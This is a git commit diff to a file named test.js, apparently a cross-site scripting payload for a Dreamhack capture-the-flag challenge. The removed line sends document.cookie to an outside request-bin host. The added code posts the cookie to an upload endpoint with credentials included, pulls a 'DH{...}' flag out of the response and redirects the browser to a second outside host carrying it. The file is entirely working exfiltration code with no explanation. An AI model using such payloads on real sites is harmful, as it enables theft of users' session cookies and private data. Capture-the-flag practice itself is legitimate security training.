cb2582b9af034b1beae66205c640f216d3b20619
xavi-git <cme1245@naver.com>
2024-07-09 02:04:01 +0900

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,16 @@
-location.href="https://uuhmyrv.request.dreamhack.games/?q="+document.cookie
+fetch("/user/upload", {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/x-www-form-urlencoded',                 
+    'Accept': '*/*'
+  },
+  credentials: 'include',
+  body: new URLSearchParams({
+                'filename': document.cookie,    
+                'data': 'test'
+            })
+}).then(response => {
+    return response.text();
+  }).then(flag => {
+  location.href = "https://cbafxmy.request.dreamhack.games/?q="+/DH{.*}/.exec(flag);
+});
